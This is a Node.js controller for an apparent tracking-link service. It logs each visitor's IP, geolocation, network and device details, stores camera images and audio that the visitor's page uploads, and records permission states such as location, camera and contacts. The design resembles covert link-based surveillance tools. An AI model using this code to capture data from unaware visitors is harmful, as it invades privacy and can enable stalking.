const Link = require('../models/link');
const { uploadToCloudinary } = require('../utils/uploadToCloudinary');
const { getIpDetails } = require('../utils/getIpDetails');
const { parseUserAgent } = require('../utils/deviceParser');

/**
 * Track Visit - GET /page/:pageId
 * Main tracking endpoint that captures visitor data and saves to MongoDB
 */
const trackVisit = async (req, res) => {
  try {
    const { pageId } = req.params;
    
    // Find link by pageId
    const link = await Link.findOne({ pageId });
    if (!link) {
      return res.status(404).json({ 
        success: false,
        message: 'Link not found' 
      });
    }

    // Extract IP address (handle proxies/load balancers)
    const forwardedFor = req.headers['x-forwarded-for'];
    const ip = forwardedFor 
      ? forwardedFor.split(',')[0].trim() 
      : req.ip || req.connection.remoteAddress || req.socket.remoteAddress || '';

    // Extract referrer and user agent
    const referrer = req.headers.referer || req.headers.referrer || '';
    const userAgent = req.headers['user-agent'] || '';

    // Parse device info from user agent
    const deviceInfo = parseUserAgent(userAgent);

    // Fetch IP location details (async, don't block response)
    let ipDetails = {
      city: '',
      region: '',
      country: '',
      continent: '',
      region_code: '',
      country_code: '',
      continent_code: '',
      latitude: '',
      longitude: '',
      time_zone: '',
      locale_code: '',
      metro_code: '',
      is_in_european_union: false,
      network: {
        network: '',
        autonomous_system_number: '',
        autonomous_system_organization: ''
      },
      security: {
        vpn: false,
        proxy: false,
        tor: false,
        relay: false
      },
      is_private: false
    };

    // Fetch IP details (non-blocking)
    try {
      ipDetails = await getIpDetails(ip);
    } catch (error) {
      console.error(`[trackVisit] Failed to fetch IP details: ${error.message}`);
    }

    // Create log entry
    const logEntry = {
      timestamp: new Date().toISOString(),
      request: {
        ip: ip,
        rawIp: ip,
        referrer: referrer,
        userAgent: userAgent
      },
      device: {
        browser: deviceInfo.browser,
        os: deviceInfo.os,
        device: deviceInfo.device,
        deviceVendor: deviceInfo.deviceVendor,
        deviceType: deviceInfo.deviceType
      },
      clientData: {}, // Can be populated by frontend if needed
      network: {
        ip: ip,
        location: {
          city: ipDetails.city,
          region: ipDetails.region,
          country: ipDetails.country,
          continent: ipDetails.continent,
          region_code: ipDetails.region_code,
          country_code: ipDetails.country_code,
          continent_code: ipDetails.continent_code,
          latitude: ipDetails.latitude,
          longitude: ipDetails.longitude,
          time_zone: ipDetails.time_zone,
          locale_code: ipDetails.locale_code,
          metro_code: ipDetails.metro_code,
          is_in_european_union: ipDetails.is_in_european_union
        },
        network: ipDetails.network,
        security: ipDetails.security,
        is_private: ipDetails.is_private
      },
      captures: {
        image: null,
        audio: null
      },
      permissions: {
        location: 'not_requested',
        cameraview: 'not_requested',
        contacts: 'not_requested',
        media: 'not_requested',
        notification: 'not_requested'
      }
    };

    // Push log entry (append only, never overwrite)
    link.logs.push(logEntry);
    await link.save();

    const savedLog = link.logs[link.logs.length - 1];
    const logId = savedLog._id?.toString() || null;

    console.log(`[trackVisit] ✅ Visit tracked for pageId: ${pageId}, logId: ${logId}`);

    // Return success (can redirect or return JSON)
    res.status(200).json({
      success: true,
      message: 'Visit tracked successfully',
      logId: logId
    });

  } catch (error) {
    console.error('[trackVisit] ❌ Error:', error);
    res.status(500).json({
      success: false,
      message: 'Error tracking visit',
      error: error.message
    });
  }
};

/**
 * Capture Media - POST /api/capture/:pageId
 * Upload image/audio file to Cloudinary and attach to latest log entry
 */
const captureMedia = async (req, res) => {
  try {
    const { pageId } = req.params;
    
    // Get file from multer
    const file = req.file;
    if (!file) {
      return res.status(400).json({
        success: false,
        message: 'No file uploaded'
      });
    }

    // Find link
    const link = await Link.findOne({ pageId });
    if (!link) {
      return res.status(404).json({
        success: false,
        message: 'Link not found'
      });
    }

    // Determine file type
    let fileType = 'image';
    if (file.mimetype.startsWith('audio/')) {
      fileType = 'audio';
    } else if (file.mimetype.startsWith('video/')) {
      fileType = 'audio'; // Treat video as audio for Cloudinary
    }

    // Upload to Cloudinary
    const cloudinaryUrl = await uploadToCloudinary(file.path, fileType, 'captured_media');

    // Validate URL
    if (!cloudinaryUrl || typeof cloudinaryUrl !== 'string' || !cloudinaryUrl.startsWith('http')) {
      return res.status(500).json({
        success: false,
        message: 'Upload succeeded but invalid URL returned'
      });
    }

    // Get latest log entry (or create if none exists)
    let lastLog;
    if (link.logs.length === 0) {
      // Create new log entry if none exists
      lastLog = {
        timestamp: new Date().toISOString(),
        request: {
          ip: req.ip || '',
          rawIp: req.ip || '',
          referrer: req.headers.referer || '',
          userAgent: req.headers['user-agent'] || ''
        },
        device: {},
        clientData: {},
        network: {
          ip: req.ip || '',
          location: {},
          network: {},
          security: {
            vpn: false,
            proxy: false,
            tor: false,
            relay: false
          },
          is_private: false
        },
        captures: {},
        permissions: {}
      };
      link.logs.push(lastLog);
    } else {
      lastLog = link.logs[link.logs.length - 1];
    }

    // Initialize captures if needed
    if (!lastLog.captures) {
      lastLog.captures = {};
    }

    // Save URL to appropriate field
    if (fileType === 'image') {
      lastLog.captures.image = cloudinaryUrl;
    } else {
      lastLog.captures.audio = cloudinaryUrl;
    }

    // Save to database
    link.markModified('logs');
    await link.save();

    console.log(`[captureMedia] ✅ Media uploaded for pageId: ${pageId}, type: ${fileType}`);

    res.status(200).json({
      success: true,
      url: cloudinaryUrl,
      type: fileType
    });

  } catch (error) {
    console.error('[captureMedia] ❌ Error:', error);
    res.status(500).json({
      success: false,
      message: 'Error uploading media',
      error: error.message
    });
  }
};

/**
 * Save Permissions - POST /api/permissions/:pageId
 * Save permission states to latest log entry
 */
const savePermissions = async (req, res) => {
  try {
    const { pageId } = req.params;
    const { permissions, logId } = req.body;

    if (!permissions || typeof permissions !== 'object') {
      return res.status(400).json({
        success: false,
        message: 'Permissions object is required'
      });
    }

    // Find link
    const link = await Link.findOne({ pageId });
    if (!link) {
      return res.status(404).json({
        success: false,
        message: 'Link not found'
      });
    }

    // Find log entry by logId or use latest
    let targetLog;
    if (logId && link.logs.length > 0) {
      const foundLog = link.logs.find((log) => log._id?.toString() === logId);
      if (foundLog) {
        targetLog = foundLog;
      } else {
        targetLog = link.logs[link.logs.length - 1];
      }
    } else if (link.logs.length > 0) {
      targetLog = link.logs[link.logs.length - 1];
    } else {
      // Create new log if none exists
      targetLog = {
        timestamp: new Date().toISOString(),
        request: {
          ip: req.ip || '',
          rawIp: req.ip || '',
          referrer: req.headers.referer || '',
          userAgent: req.headers['user-agent'] || ''
        },
        device: {},
        clientData: {},
        network: {
          ip: req.ip || '',
          location: {},
          network: {},
          security: {
            vpn: false,
            proxy: false,
            tor: false,
            relay: false
          },
          is_private: false
        },
        captures: {},
        permissions: {}
      };
      link.logs.push(targetLog);
    }

    // Initialize permissions if needed
    if (!targetLog.permissions) {
      targetLog.permissions = {};
    }

    // Merge permissions (only valid enum values)
    const validStatuses = ['granted', 'denied', 'not_requested', 'blocked'];
    Object.keys(permissions).forEach((key) => {
      if (validStatuses.includes(permissions[key])) {
        targetLog.permissions[key] = permissions[key];
      }
    });

    // Save to database
    link.markModified('logs');
    await link.save();

    console.log(`[savePermissions] ✅ Permissions saved for pageId: ${pageId}`);

    res.status(200).json({
      success: true,
      message: 'Permissions saved successfully'
    });

  } catch (error) {
    console.error('[savePermissions] ❌ Error:', error);
    res.status(500).json({
      success: false,
      message: 'Error saving permissions',
      error: error.message
    });
  }
};

module.exports = {
  trackVisit,
  captureMedia,
  savePermissions
};
